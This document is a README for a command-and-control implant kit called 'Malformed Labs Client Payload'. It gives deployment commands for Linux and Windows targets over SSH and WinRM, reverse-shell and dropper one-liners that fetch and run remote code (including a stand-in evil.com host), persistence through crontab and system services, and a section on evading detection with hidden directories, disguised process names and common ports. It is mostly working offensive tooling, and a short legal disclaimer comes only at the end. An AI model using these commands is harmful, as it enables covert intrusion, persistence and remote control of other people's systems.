# Malformed Labs Client Payload

A lightweight C2 client payload system for remote command execution and system management.

### Overview

This payload system provides:
- **Cross-platform client listener** (Python-based)
- **Automated deployment scripts** (Bash/PowerShell) 
- **One-liner payload generators** for quick deployment
- **Persistent installation** with service integration
- **Secure command execution** with filtering

### Files

```
client-payload/
├── client_listener.py      # Main client payload
├── deploy.sh              # Linux/macOS deployment script
├── deploy.ps1             # Windows deployment script
├── payload_generator.py   # One-liner payload generator
└── README.md             # This file
```

### Quick Start

### 1. Basic Client Listener

```bash
# Direct execution
python3 client_listener.py <C2_HOST> <C2_PORT>

# With environment variables
C2_HOST=192.168.1.10 C2_PORT=8888 python3 client_listener.py

# Custom client ID
python3 client_listener.py 192.168.1.10 8888 custom-client-01
```

### 2. Linux/macOS Deployment

```bash
# Make deployment script executable
chmod +x deploy.sh

# Basic deployment
./deploy.sh 192.168.1.100

# Advanced deployment with SSH key and service installation
./deploy.sh -u admin -k ~/.ssh/id_rsa -c 192.168.1.10 -P 8888 -s target.example.com

# Remove payload
./deploy.sh -r 192.168.1.100
```

### 3. Windows Deployment

```powershell
# Basic deployment
.\deploy.ps1 -TargetHost 192.168.1.100

# Deploy as Windows service
.\deploy.ps1 -TargetHost server.domain.com -AsService -C2Host 192.168.1.10

# Remove payload
.\deploy.ps1 -TargetHost 192.168.1.100 -Remove
```

### 4. One-liner Payloads

```bash
# Generate Python one-liner
python3 payload_generator.py 192.168.1.10 8888 -t python

# Generate Base64 encoded Bash payload
python3 payload_generator.py 192.168.1.10 8888 -t bash --encode

# Generate PowerShell payload
python3 payload_generator.py 192.168.1.10 8888 -t powershell

# Generate dropper payload
python3 payload_generator.py 192.168.1.10 8888 -t curl -u http://evil.com/payload.py
```

### Deployment Options

### SSH-based Deployment (Linux/macOS)

```bash
# Basic SSH deployment
./deploy.sh -u username -p 22 192.168.1.100

# With SSH key
./deploy.sh -u root -k ~/.ssh/id_rsa 10.0.0.50

# Custom installation directory
./deploy.sh -i /opt/.malformed -s target.example.com

# Different C2 server
./deploy.sh -c 192.168.1.10 -P 8888 target.example.com
```

### WinRM-based Deployment (Windows)

```powershell
# Basic WinRM deployment
.\deploy.ps1 -TargetHost 192.168.1.100 -Username "DOMAIN\user"

# Install as persistent service
.\deploy.ps1 -TargetHost server.domain.com -AsService

# Custom installation directory
.\deploy.ps1 -TargetHost 192.168.1.100 -InstallDir "C:\ProgramData\.system"
```

### Usage Examples

### Remote Command Execution

Once deployed, clients will automatically connect to your C2 server and await commands through the web interface.

### One-liner Deployment

```bash
# Python reverse shell
ssh user@target 'python3 -c "import urllib.request,json,subprocess,threading,time,platform,os,hashlib;..."'

# Bash dropper
ssh user@target 'curl -s http://myserver/payload.py | python3 - 192.168.1.10 8888'

# PowerShell execution
Invoke-Command -ComputerName target -ScriptBlock {powershell -EncodedCommand <BASE64>}
```

### Persistence Methods

```bash
# Systemd service (Linux)
./deploy.sh -s target.example.com

# Crontab entry
ssh user@target 'echo "@reboot python3 /tmp/.malformed/client_listener.py 192.168.1.10 8888" | crontab -'

# Windows service
.\deploy.ps1 -TargetHost target -AsService
```

### Configuration

### Environment Variables

```bash
export C2_HOST="192.168.1.10"
export C2_PORT="8888"
export CLIENT_ID="custom-identifier"
```

### Command Line Arguments

```bash
python3 client_listener.py [C2_HOST] [C2_PORT] [CLIENT_ID]
```

### Configuration File

Create `config.json` in the same directory:

```json
{
    "c2_host": "192.168.1.10",
    "c2_port": 8888,
    "client_id": "auto",
    "heartbeat_interval": 30,
    "command_check_interval": 5
}
```

### Security Features

### Command Filtering

The client includes basic command filtering to prevent dangerous operations:

- `rm -rf` - Recursive deletion
- `format` - Disk formatting  
- `shutdown` - System shutdown
- `reboot` - System restart

### Network Security

- HTTP-based communication (upgrade to HTTPS recommended)
- Timeout protection on all network requests
- Error handling for network failures

### Process Security

- Command timeout (30 seconds default)
- Non-interactive command execution
- Stderr/stdout separation

### Detection Evasion

### File System

```bash
# Hidden directories
/tmp/.malformed
/opt/.system
~/.config/update

# Legitimate-looking names
/usr/share/update-manager
/etc/systemd/system/system-update.service
```

### Process Names

```bash
# Rename binary
cp client_listener.py system-update
python3 system-update

# Process masquerading
exec -a '[kworker/0:1]' python3 client_listener.py
```

### Network

```bash
# Use common ports
C2_PORT=80    # HTTP
C2_PORT=443   # HTTPS
C2_PORT=53    # DNS
C2_PORT=8080  # HTTP-Alt
```

### Monitoring

### Client Status

Check connected clients via your C2 web interface:
- http://your-c2-server:8080
- View client status, system info, and command history

### Log Files

```bash
# Linux systemd service logs
journalctl -u system-update -f

# Manual log collection
python3 client_listener.py 2>&1 | tee client.log
```

### Troubleshooting

### Connection Issues

```bash
# Test C2 server connectivity
curl http://192.168.1.10:8888/health

# Check firewall rules
sudo ufw status
sudo iptables -L

# Verify service status
systemctl status system-update
```

### Permission Issues

```bash
# Fix permissions
chmod +x client_listener.py
chown root:root /etc/systemd/system/system-update.service

# Run as different user
sudo -u nobody python3 client_listener.py
```

### Python Dependencies

```bash
# Minimal Python installation
apt-get install python3-minimal

# No external dependencies required
# Uses only standard library modules
```

### Disclaimer

This tool is for authorized security testing and educational purposes only. Users are responsible for complying with all applicable laws and regulations. Unauthorized access to computer systems is illegal and unethical.

### License

This project is provided for educational and authorized testing purposes. Use responsibly and in accordance with all applicable laws and regulations.